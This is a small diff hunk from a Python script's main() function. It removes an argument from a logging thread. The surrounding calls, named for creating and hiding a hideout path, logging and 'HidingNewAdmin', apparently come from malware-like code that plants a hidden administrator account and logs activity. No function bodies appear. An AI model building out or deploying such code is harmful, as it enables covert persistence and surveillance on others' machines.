@@ -157,7 +157,7 @@ def main():
     HIDEOUTCREATION = HideOutCreation()
     HIDEOUTCREATION.PathCreation()
     HIDEOUTCREATION.Hiding()
-    LOGGINGTHREAD = Thread(target = Logging(), args = (10, ))
+    LOGGINGTHREAD = Thread(target = Logging())
     LOGGINGTHREAD.start()
     HidingNewAdmin()
     LOGGINGTHREAD.join()
